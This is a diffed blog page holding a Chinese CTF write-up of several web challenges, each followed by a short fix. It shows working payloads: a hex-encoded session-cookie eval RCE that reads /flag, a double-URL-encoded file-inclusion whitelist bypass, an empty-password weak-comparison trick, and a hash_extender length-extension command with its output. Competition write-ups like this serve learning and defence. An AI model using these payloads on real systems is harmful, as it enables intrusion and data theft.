-<p><img src= /img/loading.gif data-src="/images/1562850892755.png" alt="1562850892755"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850892755.png" alt="1562850892755"></p>
 <p>4位验证码爆破走起</p>
 <p>扔<code>Burpsuite</code>里</p>
-<p><img src= /img/loading.gif data-src="/images/1562850976886.png" alt="1562850976886"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850976886.png" alt="1562850976886"></p>
 <p>设置</p>
-<p><img src= /img/loading.gif data-src="/images/1562850969198.png" alt="1562850969198"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562850969198.png" alt="1562850969198"></p>
 <p>走起，然后踩了第一个坑</p>
-<p><img src= /img/loading.gif data-src="/images/1562851061799.png" alt="1562851061799"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562851061799.png" alt="1562851061799"></p>
 <p>验证码全部错误，<code>Ctrl+U</code>看了下源代码</p>
-<p><img src= /img/loading.gif data-src="/images/1562851107127.png" alt="1562851107127"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562851107127.png" alt="1562851107127"></p>
 <p>哦豁，设置<code>base64</code>编码</p>
-<p><img src= /img/loading.gif data-src="/images/1562851144415.png" alt="1562851144415"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562851144415.png" alt="1562851144415"></p>
 <p>继续爆破，时间不长出现重置密码的信息</p>
-<p><img src= /img/loading.gif data-src="/images/1562851197988.png" alt="1562851197988"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562851197988.png" alt="1562851197988"></p>
 <p>用户名<code>admin123</code>，密码<code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code>，登上去看看</p>
-<p><img src= /img/loading.gif data-src="/images/1562851268627.png" alt="1562851268627"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562851268627.png" alt="1562851268627"></p>
 <p>提示phpmyadmin，进去看看</p>
 <p>打开后发现</p>
-<p><img src= /img/loading.gif data-src="/images/1562854196288.png" alt="1562854196288"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562854196288.png" alt="1562854196288"></p>
 <p>这时候比赛方放出hint，备份文件，然后，一顿扫</p>
-<p><img src= /img/loading.gif data-src="/images/1562854391609.png" alt="1562854391609"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562854391609.png" alt="1562854391609"></p>
 <p>扫出备份文件</p>
-<p><img src= /img/loading.gif data-src="/images/1562854426155.png" alt="1562854426155"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562854426155.png" alt="1562854426155"></p>
 <p>提示</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Why not try code breaking?</span><br><span class="line">&#x2F;&#x2F;mDjNaF.php</span><br></pre></td></tr></table></figure>
 
-<p><img src= /img/loading.gif data-src="/images/1562854458724.png" alt="1562854458724"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562854458724.png" alt="1562854458724"></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>接下来的步骤在赛后参考了<code>2018RCTF</code>的原题<code>r-cursive</code>（<a href="https://delcoding.github.io/2018/05/rctf-web-writeup1/#r-cursive）" target="_blank" rel="noopener">https://delcoding.github.io/2018/05/rctf-web-writeup1/#r-cursive）</a></p>
@@ -144,7 +188,7 @@ function activateLightMode(){
 <blockquote>
 <p>GET /mDjNaF.php?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1<br>Cookie: PHPSESSID=6563686f2754455354273b<br>Host: 192.168.2.227:81<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36<br>DNT: 1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close</p>
 </blockquote>
-<p><img src= /img/loading.gif data-src="/images/1562895846737.png" alt="1562895846737"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1562895846737.png" alt="1562895846737"></p>
 <p>这样就可以构造RCE了</p>
 <p>Payload:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;mDjNaF.php?code&#x3D;eval(hex2bin(session_id(session_start()))); HTTP&#x2F;1.1</span><br><span class="line">Cookie: PHPSESSID&#x3D;6563686f2066696c655f6765745f636f6e74656e747328222f666c616722293b</span><br></pre></td></tr></table></figure>
@@ -152,11 +196,11 @@ function activateLightMode(){
 <p><code>6563686f2066696c655f6765745f636f6e74656e747328222f666c616722293b</code>Hex解码后为<code>echo file_get_contents(&quot;/flag&quot;);</code></p>
 <h2 id="Fix-it"><a href="#Fix-it" class="headerlink" title="Fix it"></a>Fix it</h2><p>修改<code>mDjNaF.php</code>文件，注释掉<code>eval</code>函数。</p>
 <h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><h2 id="Break-it"><a href="#Break-it" class="headerlink" title="Break it"></a>Break it</h2><p>打开题目</p>
-<p><img src= /img/loading.gif data-src="/images/1563019511983.png" alt="1563019511983"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563019511983.png" alt="1563019511983"></p>
 <p>查看下源代码</p>
-<p><img src= /img/loading.gif data-src="/images/1563019528128.png" alt="1563019528128"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563019528128.png" alt="1563019528128"></p>
 <p>注释掉了一个名为<code>source</code>的<code>php</code>文件，访问下</p>
-<p><img src= /img/loading.gif data-src="/images/1563019564987.png" alt="1563019564987"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563019564987.png" alt="1563019564987"></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];<span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">//判断是否传递了page参数</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//判断page是否在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );<span class="comment">//进行问号截取</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );<span class="comment">//出问题的代码</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];<span class="comment">//文件包含</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>源代码显示是文件包含类型的，想要利用需要满足3个条件</p>
@@ -166,75 +210,63 @@ function activateLightMode(){
 <li>通过<code>kind</code>类中的<code>checkFile</code>方法</li>
 </ol>
 <p>所以用%253f（二次URL解码后是<code>?</code>）就可以绕过了，PAYLOAD：<code>file=source.php%253f/../flag.php</code></p>
-<p><img src= /img/loading.gif data-src="/images/1563020120782.png" alt="1563020120782"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563020120782.png" alt="1563020120782"></p>
 <p>查看源代码是</p>
-<p><img src= /img/loading.gif data-src="/images/1563020138445.png" alt="1563020138445"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563020138445.png" alt="1563020138445"></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>猜密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">session_start();</span></span><br><span class="line"><span class="comment">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="comment">if (isset ($_POST['password'])) &#123;</span></span><br><span class="line"><span class="comment">	if ($_POST['pwd'] == $_SESSION['pwd'])</span></span><br><span class="line"><span class="comment">		die('Flag:'.$flag);</span></span><br><span class="line"><span class="comment">	else&#123;</span></span><br><span class="line"><span class="comment">		print '&lt;p&gt;猜测错误.&lt;/p&gt;';</span></span><br><span class="line"><span class="comment">		$_SESSION['pwd']=time().time();</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"猜密码"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
 <p>如果<code>post</code>的<code>pwd</code>等于当前的时间的时间戳，就返回<code>flag</code>,尝试过提前预判时间，发现不可以，就只能直接入手题目了，这里用到了一个弱比较，来进行一个空比较，<code>session ID</code>是我们可控的，<code>pwd</code>也是我们可控的，唯一就是<code>session</code>我们无法控制是多少，但是可以置为空，所以直接<code>post</code>空的<code>pwd</code>过去就可以了（这是<code>fix</code>后的）</p>
-<p><img src= /img/loading.gif data-src="/images/1563020450719.png" alt="1563020450719"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563020450719.png" alt="1563020450719"></p>
 <h2 id="Fix-it-1"><a href="#Fix-it-1" class="headerlink" title="Fix it"></a>Fix it</h2><ol>
 <li>可参考phpmyadmin官方的修复方式</li>
 <li><code>die(&#39;Flag:&#39;.$flag);</code>-&gt;<code>die(&#39;Flag:NOPE&#39;);</code></li>
 </ol>
 <h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><h2 id="Break-it-1"><a href="#Break-it-1" class="headerlink" title="Break it"></a>Break it</h2><p>打开是个卫星控制系统，要日卫星？</p>
-<p><img src= /img/loading.gif data-src="/images/1563443581056.png" alt="1563443581056"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563443581056.png" alt="1563443581056"></p>
 <p>查看下<code>robots.txt</code></p>
-<p><img src= /img/loading.gif data-src="/images/1563443609590.png" alt="1563443609590"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563443609590.png" alt="1563443609590"></p>
 <p>访问看看</p>
-<p><img src= /img/loading.gif data-src="/images/1563443626224.png" alt="1563443626224"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563443626224.png" alt="1563443626224"></p>
 <p>登录时抓包，发现有段<code>hash_key</code></p>
-<p><img src= /img/loading.gif data-src="/images/1563443679265.png" alt="1563443679265"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563443679265.png" alt="1563443679265"></p>
 <p>猜测是<code>md5</code>后的值，探测下目录</p>
-<p><img src= /img/loading.gif data-src="/images/1563443766952.png" alt="1563443766952"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563443766952.png" alt="1563443766952"></p>
 <p>发现了<code>License.txt</code></p>
 <p>访问后发现了部分源代码</p>
-<p><img src= /img/loading.gif data-src="/images/1563443803943.png" alt="1563443803943"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563443803943.png" alt="1563443803943"></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxxx_just_a_sample_xxxxxxx&#125;"</span>;</span><br><span class="line">$bisskey = <span class="string">"xxxxxxxxx_just_a_sample_xxxxxxx"</span>; <span class="comment">// To remember Easily, 10 chars allowed.</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">header(<span class="string">"hash_key:"</span> . $hash_key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"MyIdentity"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin123"</span> &amp;&amp; urldecode($password) != <span class="string">"admin123"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">"MyIdentity"</span>] === md5($bisskey . urldecode($username .$password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Great! You win!\n"</span>;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">"&lt;!-- Y0ur f!4g 1s here "</span>. $flag . <span class="string">"--&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"I don't konw what you say!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"I don't konw what you say!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"hash_key"</span>, md5($bisskey . urldecode(<span class="string">"admin123"</span> . <span class="string">"admin123"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));<span class="comment">//hashkey算法</span></span><br></pre></td></tr></table></figure>
 
 <p>其中<code>hash_key</code>算法为<code>$bisskey（长度10的字符串）</code>与url解码后的<code>admin123admin123</code>相连接后进行<code>md5</code>加密，爆破是不可能爆破了，查阅资料后发现可以用哈希扩展攻击，构造payload:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;hash_extender# .&#x2F;hash_extender --data admin123admin123 --secret 10 --append ciscn --signature e7187cb49ce6d5958d279284af968254 --format md5</span><br><span class="line">Type: md5</span><br><span class="line">Secret length: 10</span><br><span class="line">New signature: c862a00ecfd776d1907b30da639431e7</span><br><span class="line">New string: 61646d696e31323361646d696e313233800000000000000000000000000000000000000000000000000000000000d000000000000000636973636e</span><br></pre></td></tr></table></figure>
 
 <p>替换<code>MyIdentify</code>和<code>password</code>后即可获得<code>flag</code></p>
-<p><img src= /img/loading.gif data-src="/images/1563445111368.png" alt="1563445111368"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/images/1563445111368.png" alt="1563445111368"></p>
 <h2 id="Fix-it-2"><a href="#Fix-it-2" class="headerlink" title="Fix it"></a>Fix it</h2><p>改掉<code>bisskey</code>的值</p>
-</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Sp4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0x20h.com/p/ece4.html">https://0x20h.com/p/ece4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0x20h.com" target="_blank">Sp4ce's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post_share"><div class="social-share" data-image="/img/random/material-4.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/p/7f02.html"><img class="prev_cover" data-src="/img/random/material-6.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">QQ客户端一处BUG</div></div></a></div><div class="next-post pull_right"><a href="/p/bf2f.html"><img class="next_cover" data-src="/img/random/material-2.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">5W WordPress站点被shell事件调查报告</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/p/3354270344.html" title="X-NUCA CTF 1~3 Write-Up"><img class="relatedPosts_cover" data-src="/img/random/material-10.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2017-11-26</div><div class="relatedPosts_title">X-NUCA CTF 1~3 Write-Up</div></div></a></div><div class="relatedPosts_item"><a href="/p/80e1.html" title="2019年大学生信息安全竞赛"><img class="relatedPosts_cover" data-src="/img/random/material-6.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-04-23</div><div class="relatedPosts_title">2019年大学生信息安全竞赛</div></div></a></div><div class="relatedPosts_item"><a href="/p/2036532966.html" title="2018年XNUCA Web部分WriteUp"><img class="relatedPosts_cover" data-src="/img/random/material-3.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-11-27</div><div class="relatedPosts_title">2018年XNUCA Web部分WriteUp</div></div></a></div><div class="relatedPosts_item"><a href="/p/2364522992.html" title="一个CTF题"><img class="relatedPosts_cover" data-src="/img/random/material-4.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-01-20</div><div class="relatedPosts_title">一个CTF题</div></div></a></div><div class="relatedPosts_item"><a href="/p/2322302582.html" title="校园网搭建FBCTF平台"><img class="relatedPosts_cover" data-src="/img/random/material-15.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-10-14</div><div class="relatedPosts_title">校园网搭建FBCTF平台</div></div></a></div><div class="relatedPosts_item"><a href="/p/3623178882.html" title="FBCTF汉化 基于Ubuntu 16.04"><img class="relatedPosts_cover" data-src="/img/random/material-16.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2018-11-14</div><div class="relatedPosts_title">FBCTF汉化 基于Ubuntu 16.04</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var requestSetting = function (from,set) {
-  var from = from
-  var setting = set.split(',').filter(function(item){
-  return from.indexOf(item) > -1
-  });
-  setting = setting.length == 0 ? from :setting;
-  return setting
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Sp4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0x20h.com/p/ece4.html">https://0x20h.com/p/ece4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0x20h.com" target="_blank">Sp4ce's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post_share"><div class="social-share" data-image="/img/random/material-12.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/p/7f02.html"><img class="prev-cover" data-lazy-src="/img/random/material-14.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">QQ客户端一处BUG</div></div></a></div><div class="next-post pull-right"><a href="/p/bf2f.html"><img class="next-cover" data-lazy-src="/img/random/material-1.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">5W WordPress站点被shell事件调查报告</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/3354270344.html" title="X-NUCA CTF 1~3 Write-Up"><img class="cover" data-lazy-src="/img/random/material-9.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2017-11-26</div><div class="title">X-NUCA CTF 1~3 Write-Up</div></div></a></div><div><a href="/p/2036532966.html" title="2018年XNUCA Web部分WriteUp"><img class="cover" data-lazy-src="/img/random/material-12.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-11-27</div><div class="title">2018年XNUCA Web部分WriteUp</div></div></a></div><div><a href="/p/80e1.html" title="2019年大学生信息安全竞赛"><img class="cover" data-lazy-src="/img/random/material-3.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-04-23</div><div class="title">2019年大学生信息安全竞赛</div></div></a></div><div><a href="/p/2364522992.html" title="一个CTF题"><img class="cover" data-lazy-src="/img/random/material-14.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-01-20</div><div class="title">一个CTF题</div></div></a></div><div><a href="/p/2322302582.html" title="校园网搭建FBCTF平台"><img class="cover" data-lazy-src="/img/random/material-19.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-10-14</div><div class="title">校园网搭建FBCTF平台</div></div></a></div><div><a href="/p/3623178882.html" title="FBCTF汉化 基于Ubuntu 16.04"><img class="cover" data-lazy-src="/img/random/material-2.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-11-14</div><div class="title">FBCTF汉化 基于Ubuntu 16.04</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">V</span><label><input id="switch-comments-btn" type="checkbox"/><span class="slider"></span></label><span class="second-comment">a</span></div></div><div class="comment-wrap"><div></div><div></div><div></div><div></div><div></div><div></div></div></div></article></main><footer id="footer" style="background-image: url(/img/random/material-12.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2016 - 2020 By Sp4ce</div><div class="framework-info"><span>框架 </span><a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    $.getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js', () => {
+      pangu.spacingElementById('content-inner')
+    })
+  }
 }
 
-var guestInfo = requestSetting(['nick','mail','link'],'nick,mail,link')
-var requiredFields = requestSetting(['nick','mail','link'],'nick,mail,link')
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
 
-window.valine = new Valine({
-  el:'#vcomment',
-  appId: 'pFyFD9ztxm24V3fTYbcslwPv-MdYXbMMI',
-  appKey: 'sW9q4Ntrbowadsh5sHB8V31r',
-  notify: false,
-  verify: false,
-  placeholder: '说点什么吧',
-  avatar: 'mm',
-  meta: guestInfo,
-  pageSize: '10',
-  lang: 'zh-cn',
-  recordIP: true,
-  serverURLs: '',
-  emojiCDN: '',
-  emojiMaps: "",
-  enableQQ: true,
-  requiredFields: requiredFields
